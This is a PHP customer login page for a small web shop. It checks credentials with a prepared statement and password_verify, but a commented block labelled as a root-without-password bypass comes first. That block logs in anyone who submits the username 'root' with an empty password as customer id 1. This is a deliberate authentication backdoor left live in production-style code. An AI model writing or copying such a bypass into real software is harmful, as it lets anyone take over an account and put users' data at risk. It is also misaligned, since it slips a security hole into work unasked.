<?php
// customer/login.php
session_start();
require_once('../config/database.php');

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';

    // --------------------------
    // ROOT‐WITHOUT‐PASSWORD BYPASS
    // --------------------------
    if ($username === 'root' && $password === '') {
        // Assume the “root” customer row has id = 1
        $_SESSION['customer_id'] = 1;
        header('Location: view_products.php');
        exit;
    }
    // --------------------------

    // Original validation for all other users:
    if ($username === '' || $password === '') {
        $error = 'Please fill in all fields.';
    } else {
        $stmt = $pdo->prepare('SELECT id, password_hash FROM customers WHERE username = ?');
        $stmt->execute([$username]);
        $customer = $stmt->fetch();

        if ($customer && password_verify($password, $customer['password_hash'])) {
            $_SESSION['customer_id'] = $customer['id'];
            header('Location: view_products.php');
            exit;
        } else {
            $error = 'Username or password is incorrect.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Customer Login</title>
</head>
<body>
  <h2>Customer Login</h2>
  <?php if ($error): ?>
    <p style="color:red;"><?= htmlspecialchars($error) ?></p>
  <?php endif; ?>
  <form method="post" action="">
    <label>Username:
      <input type="text" name="username" value="<?= htmlspecialchars($username ?? '') ?>">
    </label><br>
    <label>Password:
      <input type="password" name="password">
    </label><br>
    <button type="submit">Log In</button>
  </form>
</body>
</html>
